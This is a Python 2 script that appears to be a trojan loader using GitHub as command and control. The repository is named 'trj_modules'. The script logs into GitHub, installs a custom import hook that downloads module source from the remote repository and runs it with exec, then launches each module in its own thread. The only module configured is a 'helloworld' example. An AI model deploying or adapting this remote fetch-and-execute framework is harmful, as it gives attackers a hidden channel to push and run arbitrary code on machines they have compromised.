import sys, imp, base64, importlib, threading
from github3 import *

class Downloader(object):
    def __init__(self, username, password, repo, branch):        
        self.github = login(username=username, password=password)
        self.repo   = self.github.repository(username, repo)
        self.branch = self.repo.branch(branch)
        self.tree   = self.branch.commit.commit.tree.recurse()
        self.sha    = self.branch.commit.sha

    def file(self, path):
        for filename in self.tree.tree:
            if path in filename.path:
                print "[*] Found file %s" % path
                blob = self.repo.blob(filename._json_data['sha'])
                return base64.b64decode(blob.content)
        return None

    def __eq__(self, other): return self.sha == other.sha
    def __ne__(self, other): return self.sha != other.sha
    

class GitImporter(object):

    def __init__(self, downloader):
        self.current_module_code = ""
        self.download = downloader

    def find_module(self, fullname, path=None):
        """This method is called by Python if this class
        is on sys.path. fullname is the fully-qualified
        name of the module to look for, and path is either
        __path__ (for submodules and subpackages) or None (for
        a top-level module/package).

        Note that this method will be called every time an import
        statement is detected (or __import__ is called), before
        Python`s built-in package/module-finding code kicks in."""

        print "[*] Attempting to retrieve %s" % fullname
        new_library = self.download.file(fullname)

        if new_library is not None:
            self.current_module_code = new_library
            return self
        return None

    def load_module(self, fullname):
        """This method is called by Python if GitImporter.find_module
        does not return None. fullname is the fully-qualified name of the
        module/package that was requested."""

        module = imp.new_module(fullname)
        exec self.current_module_code in module.__dict__
        sys.modules[fullname] = module
        return module

def load(downloader,modules):
    loaded_modules = []
    sys.meta_path = [GitImporter(downloader)]
    for module in modules:
        print "[*] Loading module %s" % module
        loaded_modules.append(importlib.import_module(module))
    return loaded_modules


config = {
    'username': 'simonvpe',
    'password': '********',
    'module_repo': 'trj_modules',
    'module_branch': 'master',
    'modules': {
        'helloworld' : {
            'number' : 12
        }
    }
}

# Load and run modules, each one in a thread of its own
downloader = Downloader(config['username'],config['password'],config['module_repo'],config['module_branch'])
mod        = load(downloader,config['modules'].keys())
args       = config['modules'].values()
threads    = []
for m in zip(mod, args):
    threads.append(threading.Thread(target=m[0].run, args=(m[1],)))
    threads[-1].start()

# Wait for all threads to terminate
for thread in threads: thread.join()
